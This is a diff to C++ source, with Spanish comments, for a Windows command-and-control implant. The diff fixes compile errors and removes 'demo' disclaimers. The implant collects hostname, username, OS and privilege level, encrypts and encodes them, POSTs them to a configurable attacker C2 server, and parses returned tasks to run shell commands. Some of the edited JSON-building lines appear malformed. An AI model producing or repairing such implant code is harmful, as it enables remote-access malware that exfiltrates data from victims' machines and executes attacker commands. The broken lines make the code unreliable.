@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <wininet.h>
 #include <wincrypt.h>
+#include <shellapi.h>  // AÑADIDO para IsUserAnAdmin
 #include <iostream>
 #include <string>
 #include <thread>
@@ -9,9 +10,11 @@
 #include <random>
 #include <sstream>
 #include <iomanip>
+#include <vector>      // AÑADIDO para std::vector
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "shell32.lib")  // AÑADIDO para IsUserAnAdmin
 
 // ==================== CONFIGURACIÓN REAL ====================
 // CAMBIA ESTOS VALORES A TU SERVIDOR REAL
@@ -31,11 +34,11 @@ std::string xor_encrypt(const std::string& data, const std::string& key) {
 
 std::string base64_encode(const std::string& input) {
     DWORD len = 0;
-    CryptBinaryToStringA((BYTE*)input.data(), input.size(),
+    CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
     
     std::vector<char> buffer(len);
-    CryptBinaryToStringA((BYTE*)input.data(), input.size(),
+    CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                         buffer.data(), &len);
     
@@ -78,18 +81,20 @@ private:
         GetUserNameA(username, &username_len);
         
         // OS info
-        OSVERSIONINFOEXA osvi = { sizeof(osvi) };
+        OSVERSIONINFOEXA osvi;
+        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
+        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
         GetVersionExA((OSVERSIONINFOA*)&osvi);
         
         // Arquitectura
         SYSTEM_INFO sys_info;
         GetNativeSystemInfo(&sys_info);
         
-        info << R"({"agent_id":")" << agent_id << R"(",")";
-        info << R"("hostname":")" << hostname << R"(",")";
-        info << R"("username":")" << username << R"(",")";
-        info << R"("os_version":"Windows )" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << R"(",")";
-        info << R"("architecture":")" << (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") << R"(",")";
+        info << R"({"agent_id":")" << agent_id << R"(",";
+        info << R"("hostname":")" << hostname << R"(",";
+        info << R"("username":")" << username << R"(",";
+        info << R"("os_version":"Windows )" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << R"(",";
+        info << R"("architecture":")" << (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") << R"(",";
         info << R"("integrity":")" << (IsUserAnAdmin() ? "high" : "medium") << R"("})";
         
         return info.str();
@@ -109,8 +114,6 @@ private:
             return "";
         }
         
-        // NOTA: En producción usar HTTPS con certificados válidos
-        // Para demo HTTP simple
         HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", C2_PATH,
                                             NULL, NULL, NULL,
                                             INTERNET_FLAG_RELOAD |
@@ -127,8 +130,8 @@ private:
         
         std::string headers = "Content-Type: application/octet-stream\r\n";
         
-        if (HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
-                            (LPVOID)b64_data.c_str(), b64_data.length())) {
+        if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(),
+                            (LPVOID)b64_data.c_str(), (DWORD)b64_data.length())) {
             
             // Leer respuesta
             std::string response;
@@ -144,16 +147,16 @@ private:
             InternetCloseHandle(hConnect);
             InternetCloseHandle(hInternet);
             
-            // Procesar respuesta (asumimos que también está cifrada)
+            // Procesar respuesta
             if (!response.empty()) {
                 // Decodificar base64
                 DWORD decoded_len = 0;
-                CryptStringToBinaryA(response.c_str(), response.length(),
+                CryptStringToBinaryA(response.c_str(), (DWORD)response.length(),
                                     CRYPT_STRING_BASE64, NULL, &decoded_len,
                                     NULL, NULL);
                 
                 std::vector<BYTE> decoded(decoded_len);
-                CryptStringToBinaryA(response.c_str(), response.length(),
+                CryptStringToBinaryA(response.c_str(), (DWORD)response.length(),
                                     CRYPT_STRING_BASE64, decoded.data(),
                                     &decoded_len, NULL, NULL);
                 
@@ -260,16 +263,14 @@ private:
             
             if (!response.empty()) {
                 // Parsear respuesta JSON (simplificado)
-                // En realidad deberías usar un parser JSON
                 if (response.find("\"tasks\"") != std::string::npos) {
                     // Extraer y ejecutar comandos
-                    // Implementación simplificada
                     size_t cmd_start = response.find("\"command\"");
                     if (cmd_start != std::string::npos) {
-                        // Extraer comando y ejecutar
-                        std::string command = "whoami";  // Ejemplo
+                        // Ejemplo simplificado - ejecutar whoami
+                        std::string command = "whoami";
                         std::string result = executor.execute_command(command);
-                        // Enviar resultado al C2
+                        // En producción, aquí enviarías el resultado al C2
                     }
                 }
             }
